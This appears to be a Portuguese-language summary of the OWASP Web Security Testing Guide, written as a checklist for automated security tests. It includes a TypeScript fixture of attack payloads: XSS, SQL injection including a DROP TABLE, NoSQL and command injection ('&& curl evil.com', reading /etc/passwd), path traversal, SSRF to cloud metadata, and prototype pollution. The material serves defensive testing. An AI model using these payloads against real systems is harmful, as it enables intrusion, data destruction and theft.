# Web Security Testing — Overview

Resumo do OWASP Web Security Testing Guide (WSTG) para servir de checklist em geração de testes automatizados.

## Categorias do WSTG

1. **Information Gathering** — fingerprinting, recon, exposed files (.git, .env).
2. **Configuration & Deployment Management** — headers ausentes, métodos HTTP perigosos (`TRACE`, `OPTIONS`), credenciais default.
3. **Identity Management** — registro inseguro, account enumeration, weak password policy.
4. **Authentication** — brute force, credential transport, weak lockout, default credentials, password reset.
5. **Authorization** — directory traversal, bypass de auth, privilege escalation, IDOR.
6. **Session Management** — bypass, session fixation, exposed cookies, CSRF, logout, timeout.
7. **Input Validation** — XSS (Reflected, Stored, DOM), SQL/NoSQL Injection, OS Command, LDAP, XPath, SSI, XXE, SSRF, Buffer Overflow, Race Conditions.
8. **Error Handling** — stack traces, error codes informativos.
9. **Cryptography** — weak transport, padding oracle, sensitive info em transit/rest.
10. **Business Logic** — workflow bypass, data validation, time-of-check-time-of-use.
11. **Client-side** — DOM XSS, JS execution, HTML injection, CSS injection, clickjacking, Cross-Origin Resource Sharing, WebSockets, Web Storage, postMessage.
12. **API Testing** — abuse de paginação, mass assignment, broken object level authorization, broken function level authorization, rate limit, schema enforcement.

## Mapeamento Categoria → Tipo de Teste Automatizado

| Categoria WSTG | Onde testar | Exemplos |
|----------------|-------------|----------|
| Configuration | Integration (HTTP) | headers, cookies, métodos rejeitados |
| Identity Mgmt | Integration | registro com email duplicado, format check |
| Authentication | Integration | brute force, JWT alg:none, session fixation |
| Authorization | Integration | IDOR (Alice tenta ver dados de Bob), role check |
| Session Mgmt | Integration / E2E | regeneração após login, logout invalida |
| Input Validation | Unit + Integration | parametrize com payloads (XSS/SQLi/SSRF/Path) |
| Error Handling | Integration | 500 não mostra stack em prod |
| Cryptography | Unit | hash usa bcrypt, NÃO MD5; HMAC com timingSafeEqual |
| Business Logic | E2E | fluxo de checkout, race condition em saldo |
| Client-side | E2E (Playwright) | dialog não dispara após injeção |
| API Testing | Integration | mass assignment, BOLA, BFLA, rate limit |

## Payloads Mínimos Recomendados (banco de fixtures)

Manter um arquivo `tests/security/fixtures/payloads.ts`:

```ts
export const payloads = {
  xss: [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    "<svg/onload=alert(1)>",
    '<iframe srcdoc="<script>alert(1)</script>">',
  ],
  sqli: [
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    String.raw`1\' OR 1=1--`,
    "admin'--",
  ],
  nosqli: [
    { $ne: null },
    { $gt: '' },
    { $where: '1==1' },
    "'; return true; var x='",
  ],
  pathTraversal: [
    '../etc/passwd',
    '..%2Fetc%2Fpasswd',
    '....//etc/passwd',
    '..\\..\\windows\\win.ini',
  ],
  ssrf: [
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:6379',
    'http://127.0.0.1:5432',
    'file:///etc/passwd',
    'gopher://localhost:11211/_stats',
  ],
  cmdInjection: [
    '; ls -la',
    '`id`',
    '$(whoami)',
    '| cat /etc/passwd',
    '&& curl evil.com',
  ],
  protoPollution: [
    JSON.parse('{"__proto__":{"polluted":true}}'),
    JSON.parse('{"constructor":{"prototype":{"polluted":true}}}'),
  ],
};
```

## Anti-flakiness

- **Sem `setTimeout` real** para rate limit — injete clock (`vi.useFakeTimers()`).
- **Banco isolado por teste** (ex.: schema temporário Postgres ou container Mongo de teste).
- **DNS local** — bloqueie chamadas externas com `nock` ou `msw`.
- **Seed determinístico** para qualquer randomness usado em payloads.

## Orquestração CI

- Dois jobs separados:
  - `security-tests-fast` (unit + integration) — bloqueia PR.
  - `security-tests-e2e` (Playwright/Detox) — paralelo com unit, mais lento.
- Adicione `pnpm dlx semgrep --config p/owasp-top-ten` ou `gitleaks` no mesmo pipeline.

## Referência externa
- OWASP WSTG — https://owasp.org/www-project-web-security-testing-guide/
